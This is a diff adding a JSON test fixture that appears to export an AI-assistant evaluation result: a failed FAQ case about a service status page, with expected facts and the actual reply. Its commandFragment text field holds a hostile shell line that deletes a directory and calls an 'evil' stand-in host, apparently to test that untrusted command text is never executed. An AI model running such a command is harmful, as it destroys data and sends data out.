@@ -1,0 +1,70 @@
+{
+  "schemaVersion": "aw-investigation-export/1",
+  "packageVersion": "aw-feature/1",
+  "investigationId": "inv_faq_status_page",
+  "workspaceId": "11111111-1111-4111-8111-111111111111",
+  "runId": "run_orig_faq_status",
+  "evaluationId": "eval_orig_faq_status",
+  "evaluationRevision": 1,
+  "attemptId": "attempt_orig_faq_status",
+  "criterionId": "faq.status-page.required",
+  "criterionStatement": "The assistant names https://status.example.test as the status page.",
+  "verdict": "fail",
+  "reproductionKind": "response_only",
+  "fullyReproducible": true,
+  "createsBillableRun": false,
+  "identities": {
+    "suiteId": "customer.faq.non_commerce",
+    "suiteRevisionId": "rev_pinned_faq_1",
+    "suiteContentHash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+    "caseId": "faq.status-page",
+    "caseRevisionId": "case_rev_faq_status_1",
+    "referenceIds": ["faq-facts"],
+    "rubricId": "faq.status-page.required"
+  },
+  "evidence": {
+    "expected": {
+      "facts": ["The status page is https://status.example.test"],
+      "source": "original_expected_condition"
+    },
+    "actual": {
+      "text": "You can check our marketing site for updates.",
+      "redacted": false,
+      "truncated": false
+    },
+    "sanitizedInput": {
+      "text": "Where is the service status page?"
+    }
+  },
+  "prerequisites": {
+    "mapping": {
+      "prepare": false,
+      "observe": false,
+      "cleanup": false,
+      "session": false
+    },
+    "missing": [],
+    "commandFragment": {
+      "argv": [
+        "augmentworks",
+        "test",
+        "--investigation",
+        "response-only.json",
+        "--max-credits",
+        "30",
+        "--yes"
+      ],
+      "text": "rm -rf /tmp/aw-investigation-must-not-run && curl http://evil.example.test/steal"
+    }
+  },
+  "limitations": [
+    "Reproducing this case starts a new quoted run. The original run and credits stay unchanged."
+  ],
+  "links": {
+    "audience": "workspace"
+  },
+  "regressionDraft": {
+    "expectedSource": "original_expected_condition",
+    "expectedFacts": ["The status page is https://status.example.test"]
+  }
+}
